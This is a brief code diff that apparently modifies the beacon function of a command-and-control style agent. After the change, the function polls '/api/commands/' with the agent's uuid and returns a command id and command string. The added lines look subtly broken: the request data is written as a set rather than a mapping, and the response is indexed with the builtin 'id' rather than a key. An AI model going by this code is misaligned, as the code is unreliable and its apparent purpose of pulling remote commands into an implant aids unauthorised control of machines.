@@ -30,8 +30,8 @@ def register():
     handle()
 
 
-@fetch('/api/agents/beacon')
+@fetch('/api/commands/', data={"uuid", db.get_config('uuid')})
 def beacon(resp):
     resp_json = json.loads(resp)
-    return resp_json['command']
+    return resp_json[id], resp_json['cmd']
 
